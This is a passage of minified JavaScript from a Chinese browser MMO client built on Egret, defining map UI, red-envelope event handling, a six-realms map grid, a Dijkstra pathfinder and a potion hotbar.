s=this._guildBtCfgs[i].integral,a=m.GuildBattleCT.ins().getModel().ownPoint>=s?"#00ff00":"#ff0000";this.txtGuildBtDesc.textFlow=HtmlUtil.parse(gettext("沙城积分达到:"+s)+HtmlUtil.fontColor("（"+m.GuildBattleCT.ins().getModel().ownPoint+"/"+s+"）",a))},e.prototype.updateMap=function(){this.notClick.visible=u.GameMap.fbType==c.FbCT.FB_KF||u.GameMap.fbType==c.FbCT.FB_TYPE_DEVILDOM_BOSS,u.GameMap.fbType==c.FbCT.FB_TYPE_GUILD_WAR?(this.grpGuildBtTask.visible=!0,this.taskTip.visible=!1):(this.grpGuildBtTask.visible=!1,this.taskTip.visible=!0);var t=y.OpenSystem.ins().checkSysOpen(h.SystemType.PrivateCaht);this.chatBtn0.visible=t?!0:!1;var e=l.GlobalConfig.InstanceConfig[u.GameMap.fubenID];e&&(this.mapNameLab.text=e.name?e.name+"":"",window.mapTjLab=this.mapTjLab,this.mapImg.source=e.icon+"_jpg"||!1,e.targetmap&&e.targetmap.length>0&&_.MainUICC.startGuide(e.targetmap),this.btn_ZuDui.visible=!1,this.SixTrasGrop.visible=this.SixTrasGrop0.visible=u.GameMap.fbType==c.FbCT.FB_TYPE_LIU_DAO_LUN_HUI?!0:!1,p.HBSystem.ins().isShowHongBao(!u.GameMap.checkIsKf(!1)),(u.GameMap.fbType==c.FbCT.FB_TYPE_9||u.GameMap.fbType==c.FbCT.FB_PVP||u.GameMap.fbType==c.FbCT.FB_TEAM||u.GameMap.checkIsKf(!1))&&(_.MainUICC.mainBossShow=!1,this.mainMapChange()))},e.prototype.removeDisplay=function(){},e.prototype.redRefresh=function(){var t=v.MailCT.ins().redMail.v;t?this.mailBtn.showTwinkle("mainui_mail"):this.mailBtn.hideTwinkle(),this.chatBtn0.sRp=f.Friends.ins().allProvateChatRed.v},e.prototype.guajiMc=function(){if(!window.platform.isshen()){var t=C.Recharge.ins().AutoPrivilegeTime;t?(this.guaBtn.icon="mainui_gua1",this.guaBtn.hideTwinkle()):(this.guaBtn.icon="mainui_gua",this.guaBtn.showTwinkle("mainui_gua",20,24))}},e.prototype.zzMc=function(){if(!window.platform.isshen()){var t=C.Recharge.ins().godOfWarTime;!t||0>=t?(this.zzBtn.icon="mainui_zun",this.zzBtn.showTwinkle("mainui_zun",20,24)):(this.zzBtn.icon="mainui_zun1",this.zzBtn.hideTwinkle())}},e.prototype.cbMc=function(){if(!window.platform.isshen()){var t=C.Recharge.ins().recycleTime;!t||0>=t?(this.cbBtn.icon="mainui_hui",this.cbBtn.showTwinkle("mainui_hui",20,24)):(this.cbBtn.icon="mainui_hui1",this.cbBtn.hideTwinkle())}},e.prototype.changeBtn=function(){var t=!window.platform.isshen();this.guaBtn.visible=this.zzBtn.visible=this.cbBtn.visible=t},e.prototype.SixData=function(){if(u.GameMap.fbType==c.FbCT.FB_TYPE_LIU_DAO_LUN_HUI){this.findM.text=b.SixReisCT.ins().returnFindMapCount()+b.SixReisCT.ins().sixBasePos.length+"",this.hadM.text=b.SixReisCT.ins().sixBasePos.length+"";var t=l.GlobalConfig.SixUndergroundPalacesTypeConfig,e=b.SixReisCT.ins().returnMapData(b.SixReisCT.ins().pos);
if(!e||void 0==e)return;this.setSelectSixTools();var i=e.type,n=g.GameLogic.ins().kfCost,a=t[i].bossId,r=l.GlobalConfig.MonstersConfig[a].crusade;this.addTouchEvent(this.txtCost,()=>{typeof window.showsix == 'function' && window.showsix()});this.txtCost.textFlow=n>0?s.TextFlowMaker.generateTextFlow1("|C:"+o.ColorUtil.GREEN_COLOR_N+"&T:"+n+"|/"+r):s.TextFlowMaker.generateTextFlow1("|C:"+o.ColorUtil.RED_COLOR_N+"&T:0|/"+r)}},e}(a.BaseView);e.MainMap=D,window.MainMap=D,__reflect(D.prototype,"MainMap",[]),window.MainMap=D},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HBSystem=void 0;var n=i(14),o=i(0),s=i(36),a=i(2),r=i(9),l=i(171),h=i(30),u=i(453),p=i(455),d=function(t){function e(){var e=t.call(this)||this;return e.observe(r.Activity.ins().postGetRedEnvelope,e.showHongBaoTips),e.observe(r.Activity.ins().postRewardResult,e.ActRewardResult),e.observe(r.Activity.ins().postEnvelopeDataCall,e.showEnvelope),e.observe(r.Activity.ins().postRedEnvelopeData,e.updateHongBao),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.isShowHongBao=function(t){this._hongBaoContainer&&(this._hongBaoContainer.visible=t)},e.prototype.setHongBaoContainer=function(t){this._hongBaoContainer=t},e.prototype.updateHongBao=function(){if(this._hongBaoContainer&&!(this._hongBaoContainer.numElements>0))for(var t=0;t<r.Activity.ins().activityTimers.length;t++){var e=r.Activity.ins().activityTimers[t],i=r.Activity.ins().activityData[e];if(i instanceof l.ActivityType12Data){if(!i.envelopeData.length)continue;for(var n=i.envelopeData.length-1;n>=0;)if(n=i.envelopeData.length-1,i.envelopeData[n]){var o=i.envelopeData[n].id;if(!i.envelopeData[n].isOverTimer()){var s=new p.HongBaoShowItem;s.data={actId:e,eId:o},this._hongBaoContainer.addChild(s);break}i.popEnvelope(o)}else i.envelopeData.splice(t,1)}}},e.prototype.showHongBaoTips=function(t){var e=t[0],i=t[1],n=t[2],o=(t[3],t[4]),l=r.Activity.ins().activityData[e];if(l){if(n){var u=new h.RewardData;u.type=0,u.id=s.MoneyConst.yuanbao,u.count=n,a.TipsCT.ins().showGoodRewardTips(u)}i&&l.popEnvelope(i),this.HongBaoResultAni(o)}},e.prototype.HongBaoResultAni=function(t){if(this._hongBaoContainer){var e=this._hongBaoContainer.getChildAt(1);e&&e.playAni(t,this.updateHongBao,this)}},e.prototype.ActRewardResult=function(t){-1!=r.Activity.ins().activityTimers.indexOf(t)&&r.Activity.ins().activityData[t]instanceof l.ActivityType12Data&&(r.Activity.ins().isSuccee||(r.Activity.ins().activityData[t].isOpenActivity()?a.TipsCT.ins().showTips(gettext("|C:0xff0000&T:红包已过期")):a.TipsCT.ins().showTips(gettext("|C:0xff0000&T:活动已结束"))))},e.prototype.showEnvelope=function(t){if(this._hongBaoContainer){if(!t)return a.TipsCT.ins().showTips(gettext("|C:0xff0000&T:红包已过期")),this._hongBaoContainer.removeChildren(),void this.updateHongBao();if(r.Activity.ins().activityData[t.id]instanceof l.ActivityType12Data){var e=new u.HongBaoOpenItem;t.desc||(t.desc=o.GlobalConfig.ActivityType12Config[t.id][t.index].blessWord),e.data={actId:t.id,eId:t.eId,job:t.job,sex:t.sex,name:t.name,text:t.desc,index:t.index},this._hongBaoContainer.addChildAt(e,1)}}},e}(n.BaseSystem);e.HBSystem=d,window.HBSystem=d,__reflect(d.prototype,"HBSystem",[]);var c,c=window.GameSystem;!function(t){t.hbsystem=d.ins.bind(d)}(c||(c={})),window.GameSystem=c,window.HBSystem=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixreincarnationsMapItem=void 0;var n=i(1),o=i(0),s=i(2),a=i(79),r=i(8),l=i(7),h=i(5),u=i(18),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SixTrialsMapItem",e.vX=1,e.vY=1,e.layer=0,e.t=0,e.isShows=0,e.unlock=19,e.lock=30,e}return __extends(e,t),e.prototype.skinComplete=function(){this.timesL.text="",this.touchChildren=!1,this.touchEnabled=!0,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t,e,i,n=[],s=0;s<arguments.length;s++)n[s]=arguments[s];this.aniImg.visible=!1,this.timesL.visible=!0,this.observe(a.SixReisCT.ins().selectValue,this.showSelect);var p=a.SixReisCT.ins().sixBaseMap;this.layer=p[this.id-1].layer,this.isShows=p[this.id-1].state;var d=o.GlobalConfig.SixUndergroundPalacesLayerConfig[a.SixReisCT.ins().sixLayer].size;this.vX=this.id%d[1],this.vY=Math.ceil(this.layer/1e3)-1,0==this.vX?this.x=172*(d[1]-a.SixReisCT.ins().showDirArr[0]):this.x=172*(this.vX-a.SixReisCT.ins().showDirArr[0]),this.y=162*(this.vY-a.SixReisCT.ins().showDirArr[1]),2==this.isShows?(this.mapName.textFlow=h.TextFlowMaker.generateTextFlow1(null===(t=o.GlobalConfig.SixUndergroundPalacesTypeConfig[p[this.id-1].type])||void 0===t?void 0:window.getBuffname(p[this.id - 1])),this.mapName.y=this.lock,this.mapName0.visible=!1):1==this.isShows?(this.mapName.textFlow=h.TextFlowMaker.generateTextFlow1("|C:"+u.ColorUtil.GREEN+"&T:"+(null===(e=o.GlobalConfig.SixUndergroundPalacesTypeConfig[p[this.id-1].type])||void 0===e?void 0:e.mapName)+"|"),this.mapName.y=this.unlock,this.mapName0.visible=!0):(this.mapName.text=window.getBuffname(p[this.id - 1]),this.mapName.y=this.lock,this.mapName0.visible=!1),this.selectImg.visible=a.SixReisCT.ins().pos==this.layer?!0:!1;for(var c in a.SixReisCT.ins().tfMembers)a.SixReisCT.ins().tfMembers[c].pos==this.layer&&a.SixReisCT.ins().tfMembers[c].layer==a.SixReisCT.ins().sixLayer&&(this.aniImg.visible=!0,this.aniImg.source=a.SixReisCT.ins().tfMembers[c].pos==a.SixReisCT.ins().pos?"img_biaoji":"img_biaoji2",0==this.isShows);if(0==this.isShows||3==this.isShows?(this.timesL.visible=!1,a.SixReisCT.ins().pos==this.layer&&(this.timesL.visible=!0)):this.timesL.visible=!0,this.timesL.visible&&(this.t=(null===(i=p[this.id-1])||void 0===i?void 0:i.time)||0,this.t)){if(!((r.DateUtils.formatMiniDateTime(this.t)-l.GameServerCC.serverTime)/1e3<=0)){var f=(r.DateUtils.formatMiniDateTime(this.t)-l.GameServerCC.serverTime)/1e3;this.timesL.text=r.DateUtils.getFormatBySecond(f,r.DateUtils.TIME_FORMAT_1)}Timer.start(1e3,0,this.timeFun,this)}},e.prototype.onClick=function(){return 0==a.SixReisCT.ins().isShow(this.layer)?void s.TipsCT.ins().showTips(gettext("需解锁相邻地图才可到达")):void a.SixReisCT.ins().selectValue(this.id)},e.prototype.timeFun=function(){var t=(r.DateUtils.formatMiniDateTime(this.t)-l.GameServerCC.serverTime)/1e3;return 0>=t?(this.timesL.text="",void Timer.stop(this.timeFun,this)):void(this.timesL.text=r.DateUtils.getFormatBySecond(t,r.DateUtils.TIME_FORMAT_1))},e.prototype.showSelect=function(t){t==this.id?this.selectImg.visible=!0:this.selectImg.visible=!1},e.prototype.setShowOb=function(t){this.visible=t},e.prototype.clearAll=function(){this.vX=1,this.vY=1,this.layer=1001,this.removeTouchEvent(this,this.onClick),this.timesL&&(this.timesL.text=""),this.selectImg&&(this.selectImg.source=""),this.removeObserve(),Timer.stopAll(this)},e}(n.BaseView);e.SixreincarnationsMapItem=p,window.SixreincarnationsMapItem=p,__reflect(p.prototype,"SixreincarnationsMapItem",[]),window.SixreincarnationsMapItem=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainMapBar=void 0;var n=i(1),o=i(23),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="mainMapBarSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._fun=t[0],this.goBar.value=0,this.barGroup.visible=!1;var i=egret.Tween.get(this.goBar);i.to({value:100},1e3),this.observe(o.GameLogic.ins().closeChangeSceneBar,this.closeChangeBar),Timer.stop(this.closeChangeBar,this),Timer.start(1e3,1,this.timeEndHandler,this)},e.prototype.closeChangeBar=function(){Timer.stop(this.closeChangeBar,this),this._fun=null,win.close(this)},e.prototype.timeEndHandler=function(){this.barGroup.visible=!1,this._fun&&this._fun(),win.close(this),this._fun=null},e.prototype.removeDisplay=function(){Timer.stopAll(this),egret.Tween.removeTweens(this)},e}(n.BaseView);e.MainMapBar=s,window.MainMapBar=s,__reflect(s.prototype,"MainMapBar",[]),window.MainMapBar=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainMapInfo=void 0;var n=i(8),o=i(1),s=i(0),a=i(4),r=i(20),l=i(43),h=i(32),u=i(23),p=i(51),d=i(7),c=i(79),f=i(83),g=i(2),m=i(27),v=i(75),y=i(64),C=i(458),T=i(459),b=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="mainMapInfoSkin",e.showList=[],e.posXArr=[81,251,421],e.posYArr=[28,96,164],e.curGuideMapIdArr=[],e._needShowArr=[],e._guildItemArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.arc=new eui.ArrayCollection,this.mapList.dataProvider=this.arc,this.mapList.itemRenderer=C.MainMapInfoItem,this.lineArr=[];for(var t=0;t<this.grp_line.numChildren;t++)this.lineArr.push(this.grp_line.getChildAt(t));this.guide.visible=!1},e.prototype.addDisplay=function(){observe(this,this.updateMapList,u.GameLogic.ins().postEnterMap),observe(this,this.updateMapList,c.SixReisCT.ins().postSetTeamInfo),observe(this,this.updateMapList,c.SixReisCT.ins().updateMap),observe(this,this.startGuide,y.MainUICC.startGuide),observe(this,this.postPowerChange,a.ActorCC.postPowerChange),this.mapList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.updateMapList()},e.prototype.postPowerChange=function(){this.updateMapList()},e.prototype.updateMapList=function(){var t=s.GlobalConfig.InstanceConfig[r.GameMap.fubenID];if(t){if(t&&t.otherFb?this.showList=t.otherFb.concat():this.showList.length=0,r.GameMap.fbType==h.FbCT.FB_TYPE_LIU_DAO_LUN_HUI){this.showList=[];for(var e=c.SixReisCT.ins().pos,i=0;9>i;i++){var n=0;3>i?(n=e-1e3,n=this.returnValue(n,i)):4==i?n=1:i>5?(n=e+1e3,n=this.returnValue(n,i)):(n=e,n=this.returnValue(n,i)),this.showList.push(n)}}this.arc.replaceAll(this.showList),this.updateLine(),this.runGuide()}},e.prototype.returnValue=function(t,e){var i,n=0;switch(e%3){case 0:n=t-1;break;case 1:n=t;break;case 2:n=t+1}return n%1e3!=0&&n>1e3&&10011>n&&10>=n%100&&c.SixReisCT.ins().returnMapData(n)&&0!=(null===(i=c.SixReisCT.ins().returnMapData(n))||void 0===i?void 0:i.state)?n:0},e.prototype.updateLine=function(){if(this.showList.length>0){this.grp_line.visible=!0;for(var t=0,e=this.lineArr;t<e.length;t++){var i=e[t];i.visible=!1}this.showList[1]&&(this.line4_1.visible=!0),this.showList[7]&&(this.line4_7.visible=!0),this.showList[3]&&(this.line4_3.visible=!0),this.showList[5]&&(this.line4_5.visible=!0),this.showList[0]&&(this.showList[1]?(this.line4_3.visible=!0,this.line3_0.visible=!0):(this.line4_1.visible=!0,this.line1_0.visible=!0)),this.showList[2]&&(this.showList[1]?(this.line4_5.visible=!0,this.line5_2.visible=!0):(this.line4_1.visible=!0,this.line1_2.visible=!0)),this.showList[6]&&(this.showList[7]?(this.line4_3.visible=!0,this.line3_6.visible=!0):(this.line4_7.visible=!0,this.line7_6.visible=!0)),this.showList[8]&&(this.showList[7]?(this.line4_5.visible=!0,this.line5_8.visible=!0):(this.line4_7.visible=!0,this.line7_8.visible=!0))}else this.grp_line.visible=!1},e.prototype.onItemClick=function(t){var e,i,o=this.mapList.selectedItem,a=s.GlobalConfig.InstanceConfig[o];if(a&&a.type==h.FbCT.FB_TYPE_GUILD_WAR){var y=o%28e3;if(5==y){if(0==p.GuildBattleCT.ins().getModel().flagStatu){var C=Math.floor((n.DateUtils.formatMiniDateTime(p.GuildBattleCT.ins().getModel().endTime)-d.GameServerCC.serverTime)/1e3);if(0>=C)return void g.TipsCT.ins().showTips(gettext("进入皇宫cd冷却中"));var T=n.DateUtils.getFormatBySecond(C,n.DateUtils.TIME_FORMAT_10);return void g.TipsCT.ins().showTips(gettext(T+"后可进入"))}}else{var b=p.GuildBattleCT.ins().sceneId,w=s.GlobalConfig.GuildBattleLevel[b];if(w){var I=d.GameServerCC.serverTime-p.GuildBattleCT.ins().enterSceneTime;if(I<1e3*w.switchSceneCd)return void g.TipsCT.ins().showTips(gettext(Math.ceil(w.switchSceneCd-I/1e3)+" 秒后可进入"))}}var _=s.GlobalConfig.GuildBattleLevel[y];if(_.feats>0){var S=p.GuildBattleCT.ins().getModel().gongXun;if(S<_.feats)return void g.TipsCT.ins().showTips(gettext("达到"+_.feats+" 功勋后可进入"))}return void p.GuildBattleCT.ins().requestPlayNextMap(y)}if(a&&a.type==h.FbCT.FB_TYPE_SHI_KONG_ZHI_JING)if(v.BurningDesertCT.ins().checkMeIsLeader()){if(this._nextCanChangeTime>0&&egret.getTimer()<this._nextCanChangeTime)return void console.error("切换速度过快哦");v.BurningDesertCT.ins().reqSwitchMap(o),this._nextCanChangeTime=egret.getTimer()+1e3}else g.TipsCT.ins().showTips(gettext("队长才能切换地图"));else if(a&&a.type==h.FbCT.FB_TYPE_STARDOMAIN)if(f.StardomainCT.ins().checkMeIsLeader()){if(this._nextCanChangeTime>0&&egret.getTimer()<this._nextCanChangeTime)return void console.error("切换速度过快哦");f.StardomainCT.ins().reqSwitchMap(o),this._nextCanChangeTime=egret.getTimer()+1e3}else g.TipsCT.ins().showTips(gettext("队长才能切换地图"));else{if(r.GameMap.fbType==h.FbCT.FB_TYPE_LIU_DAO_LUN_HUI&&o>1){if(0==(null===(e=c.SixReisCT.ins().returnMapData(o))||void 0===e?void 0:e.state)||3==(null===(i=c.SixReisCT.ins().returnMapData(o))||void 0===i?void 0:i.state))return void g.TipsCT.ins().showTips(gettext("需解锁相邻地图才可到达"));var x=c.SixReisCT.ins().returnMapData(o).type,D=u.GameLogic.ins().kfCost,A=s.GlobalConfig.SixUndergroundPalacesTypeConfig[x].bossId,k=s.GlobalConfig.MonstersConfig[A].crusade;return k>D?void m.WarnWin.show(gettext("当前讨伐令不足，击杀将不获得击杀收益，是否确认进入？"),function(){c.SixReisCT.ins().postChangeSixPos(o)},this):void c.SixReisCT.ins().postChangeSixPos(o)}o>1&&l.CityCC.ins().sendCityGo(0,o)}},e.prototype.check2ArrayIsEqual=function(t,e){if(t.length!=e.length)return!1;t.sort(function(t,e){return t-e}),e.sort(function(t,e){return t-e});for(var i=0,n=t.length;n>i;i++)if(t[i]!=e[i])return!1;return!0},e.prototype.test=function(t,e){return t[e]},e.prototype.startGuide=function(t){this.check2ArrayIsEqual(this.curGuideMapIdArr,t)||(this.curGuideMapIdArr=t,this.runGuide())},e.prototype.runGuide=function(){for(var t,e,i,n=0,o=this._guildItemArr;n<o.length;n++){var a=o[n],l=a.getChildAt(0);this.stopTweenGuide(l),null===(t=null===a||void 0===a?void 0:a.parent)||void 0===t?void 0:t.removeChild(a)}this._needShowArr=[];var u=s.GlobalConfig.InstanceConfig[r.GameMap.fubenID];if(this.curGuideMapIdArr.length>0){for(var p=0,d=this.curGuideMapIdArr.length;d>p;p++)if(r.GameMap.fubenID==this.curGuideMapIdArr[p]||u.type!=h.FbCT.FB_TYPE_GUANQIABOSS&&u.type!=h.FbCT.FB_TYPE_CITY&&u.type!=h.FbCT.FB_TYPE_GUILD_WAR){this.curGuideMapIdArr.length=0;for(var c=0,f=this._guildItemArr;c<f.length;c++){var a=f[c],l=a.getChildAt(0);this.stopTweenGuide(l),null===(e=null===a||void 0===a?void 0:a.parent)||void 0===e?void 0:e.removeChild(a)}}else this._needShowArr.push(this.curGuideMapIdArr[p]);if(this._needShowArr.length>0)for(var g=0,p=0,d=this._needShowArr.length;d>p;p++){var m=T.MapSearch.getins().search(r.GameMap.fubenID,this._needShowArr[p]);if(m.length>1){var v=this.showList.indexOf(m[1]),y=void 0;if(g<this._guildItemArr.length)y=this._guildItemArr[g];else{y=new eui.Group;var l=new eui.Image;l.source="MainUi_json.main_xuanze",y.addChild(l),l.anchorOffsetX=20,l.anchorOffsetY=41,this._guildItemArr.push(y)}y.touchEnabled=!1,y.touchChildren=!1,this.guideToGrid(v,y),this.addChild(y),this.startTweenGuide(y),g++}}else{this.curGuideMapIdArr.length=0;for(var C=0,b=this._guildItemArr;C<b.length;C++){var a=b[C],l=a.getChildAt(0);this.stopTweenGuide(l),null===(i=null===a||void 0===a?void 0:a.parent)||void 0===i?void 0:i.removeChild(a)}}}},e.prototype.guideToGrid=function(t,e){e.x=this.posXArr[t%3],e.y=this.posYArr[t/3>>0]},e.prototype.startTweenGuide=function(t){var e=t.getChildAt(0);egret.Tween.removeTweens(e),e.y=-5,this.tweenDown(e)},e.prototype.stopTweenGuide=function(t){egret.Tween.removeTweens(t)},e.prototype.tweenDown=function(t){egret.Tween.get(t).to({y:5},500).call(this.tweenUp,this,[t])},e.prototype.tweenUp=function(t){egret.Tween.get(t).to({y:-5},500).call(this.tweenDown,this,[t])},e.prototype.GuideGo_1002=function(){for(var t=0;t<this.mapList.numElements;t++){var e=this.mapList.getElementAt(t);if(1002==e.data)return e}return null},e}(o.BaseView);e.MainMapInfo=b,window.MainMapInfo=b,__reflect(b.prototype,"MainMapInfo",[]),window.MainMapInfo=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Dijkstra=void 0;var n=function(){function t(){}return t.prototype.test=function(){var e=[[0,4,t.M,2,t.M],[4,0,4,1,t.M],[t.M,4,0,1,3],[2,1,1,0,7],[t.M,t.M,3,7,0]],i=4,n=1;t.dijkstra(e,i,n)},t.dijkstra=function(t,e,i){var n=[];for(var o in t)n[o]=t[o].concat();for(var s=n.length,a=[],r=[],l=[],h=0;s>h;h++)r[h]=[e,h],l[h]=0;a[e]=0,l[e]=1;for(var u=1;s>u;u++){for(var p=-1,d=Number.MAX_VALUE,c=0;s>c;c++)0==l[c]&&n[e][c]<d&&(d=n[e][c],p=c);if(!(0>p)){a[p]=d,l[p]=1;for(var f=0;s>f;f++)0==l[f]&&n[e][p]+n[p][f]<n[e][f]&&(n[e][f]=n[e][p]+n[p][f],r[f]=r[p].concat(f))}}return r[i]},t.M=1e4,t}();e.Dijkstra=n,window.Dijkstra=n,__reflect(n.prototype,"Dijkstra",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainPotItem=e.MainPot=void 0;var n=i(3),o=i(1),s=i(0),a=i(91),r=i(20),l=i(6),h=i(43),u=i(7),p=i(112),d=i(2),c=i(27),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="mainPotSkin",e.itemArr=[],e.timeDic={},e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=g,this.list.dataProvider=this.listArr=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){Timer.has(this.playTween,this)||Timer.start(50,0,this.playTween,this),this.list.itemRenderer=g,observe(this,this.initList,p.SysSetting.ins().setRecoverItem),observe(this,this.updateMapList,l.BagCT.ins().postItemChange),observe(this,this.updateItemCD,l.BagCT.ins().postItemCoolDown),observe(this,this.updateMapList,l.BagCT.ins().postItemAdd),observe(this,this.updateMapList,l.BagCT.ins().postItemDel),this.initList()},e.prototype.removeDisplay=function(){Timer.stop(this.playTween,this)},e.prototype.initList=function(){this.itemArr=[];var t=p.SysSetting.ins().getValue(p.SysSetting.HP_ITEM)?p.SysSetting.ins().getValue(p.SysSetting.HP_ITEM):a.ItemConst.HP_ITEM1,e=p.SysSetting.ins().getValue(p.SysSetting.MP_ITEM)?p.SysSetting.ins().getValue(p.SysSetting.MP_ITEM):a.ItemConst.MP_ITEM1,i=p.SysSetting.ins().getValue(p.SysSetting.SP_ITEM)?p.SysSetting.ins().getValue(p.SysSetting.SP_ITEM):a.ItemConst.SP_ITEM1;this.itemArr.push(t,e,i,a.ItemConst.BACK_ITEM);var n=l.BagCT.ins().getBagItemById(t);n&&n.countdown?this.timeDic[t]=n.countdown:this.timeDic[t]=0;var o=l.BagCT.ins().getBagItemById(e);o&&o.countdown?this.timeDic[e]=o.countdown:this.timeDic[e]=0;var s=l.BagCT.ins().getBagItemById(i);s&&s.countdown?this.timeDic[i]=s.countdown:this.timeDic[i]=0,this.timeDic[a.ItemConst.BACK_ITEM]=!1,this.updateMapList()},e.prototype.updateMapList=function(){this.listArr.replaceAll(this.itemArr)},e.prototype.updateItemCD=function(){var t=p.SysSetting.ins().getValue(p.SysSetting.HP_ITEM)?p.SysSetting.ins().getValue(p.SysSetting.HP_ITEM):a.ItemConst.HP_ITEM1,e=p.SysSetting.ins().getValue(p.SysSetting.MP_ITEM)?p.SysSetting.ins().getValue(p.SysSetting.MP_ITEM):a.ItemConst.MP_ITEM1,i=p.SysSetting.ins().getValue(p.SysSetting.SP_ITEM)?p.SysSetting.ins().getValue(p.SysSetting.SP_ITEM):a.ItemConst.SP_ITEM1,n=l.BagCT.ins().getBagItemById(t);n&&n.countdown?this.timeDic[t]=n.countdown:this.timeDic[t]=0;var o=l.BagCT.ins().getBagItemById(e);o&&o.countdown?this.timeDic[e]=o.countdown:this.timeDic[e]=0;var s=l.BagCT.ins().getBagItemById(i);s&&s.countdown?this.timeDic[i]=s.countdown:this.timeDic[i]=0},e.prototype.updateSpape=function(t,e){var i=l.BagCT.ins().isCoolDown(e);return 0>=i?(t.scaleY=1,t.visible=!1,void(this.timeDic[e]=0)):void this.timeDic[e]},e.prototype.playTween=function(){for(var t=this.itemArr.length,e=0;t>e;e++){var i=this.shapeGrp.getElementAt(e);if(0==e||1==e||2==e){var n=this.itemArr[e];if(this.timeDic[n]&&this.timeDic[n]-u.GameServerCC.serverTime>0&&s.GlobalConfig.ItemConfig[n].useCd){i.visible=!0;var o=Math.max(0,Math.min(1,(this.timeDic[n]-u.GameServerCC.serverTime)/s.GlobalConfig.ItemConfig[n].useCd));i.scaleY=o}else i.visible=!1,i.scaleY=1}3==e&&(i.visible=!1)}},e.prototype.play=function(t,e,i){if(this.timeDic[e]+=1,i<=this.timeDic[e])return this.timeDic[e]=0,t.visible=!1,void(t.scaleY=1);var n=l.BagCT.ins().getBagItemById(e);if(!(n&&n.countdown&&n.countdown-u.GameServerCC.serverTime>0&&s.GlobalConfig.ItemConfig[e].useCd))return this.timeDic[e]=0,t.visible=!1,void(t.scaleY=1);t.visible=!0;var o=Math.max(0,Math.min(1,((null===n||void 0===n?void 0:n.countdown)-u.GameServerCC.serverTime)/s.GlobalConfig.ItemConfig[e].useCd));t.scaleY=o},e.prototype.GuideCB=function(){var t;if(this.list||!((null===(t=this.list)||void 0===t?void 0:t.numElements)<3))return this.list.getElementAt(3)},e}(o.BaseView);e.MainPot=f,window.MainPot=f,__reflect(f.prototype,"MainPot",[]),window.MainPot=f;var g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){var t;if(this.data==a.ItemConst.BACK_ITEM){var e=(null===(t=s.GlobalConfig.ItemConfig[a.ItemConst.BACK_ITEM])||void 0===t?void 0:t.icon)||"";this.itemIcon.setIcon(e)}else this.itemIcon.setIcon(this.data);this.count.text=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,this.data)+""},e.prototype.onClick=function(){var t;if(3!=this.itemIndex)return void win.open("MainPotTip",this.itemIndex);if(!h.CityCC.ins().isCity){if(l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,a.ItemConst.BACK_ITEM)<1){var e=(null===(t=s.GlobalConfig.ItemConfig[a.ItemConst.BACK_ITEM])||void 0===t?void 0:t.name)||"";return void d.TipsCT.ins().showTips(e+gettext("不足"))}c.WarnWin.show(gettext("确定回城?"),function(){r.GameMap.fubenID,h.CityCC.ins().sendCityGo(0,0)},this)}},e}(n.BaseItemRender);e.MainPotItem=g,window.MainPotItem=g,__reflect(g.prototype,"MainPotItem",[]),window.MainPotItem=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainPotTipItem=e.MainPotTip=void 0;var n=i(3),o=i(1),s=i(0),a=i(6),r=i(112),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e._sn_="mainPotTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=h,this.list.dataProvider=new eui.ArrayCollection([]),this.addTouchEvent(this.closebtn,this.onClick),this.addTouchEvent(this.gobtn,this.onClick),this.list.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this)},e.prototype.initDrugInfo=function(){this._drugDic={};var t=s.GlobalConfig.DurgsConfig;for(var e in t){var i=t[e];this._drugDic[i.type-1]||(this._drugDic[i.type-1]=[]),this._drugDic[i.type-1].push(i.id)}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.openIdx=t[0]||0,void 0!=this.openIdx&&(this._drugDic||this.initDrugInfo(),this.list.dataProvider=new eui.ArrayCollection(this._drugDic[this.openIdx]||[]))},e.prototype.onItemClick=function(t){var e="";0==this.openIdx?e=r.SysSetting.HP_ITEM:1==this.openIdx?e=r.SysSetting.MP_ITEM:2==this.openIdx&&(e=r.SysSetting.SP_ITEM),r.SysSetting.ins().setValue(e,this.list.selectedItem),r.SysSetting.ins().setRecoverItem(),win.close(this)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.closebtn:win.close(this);break;case this.gobtn:win.close(this),win.open("ShopMianCityTip")}},e}(o.BaseView);e.MainPotTip=l,window.MainPotTip=l,__reflect(l.prototype,"MainPotTip",[]),window.MainPotTip=l;var h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return 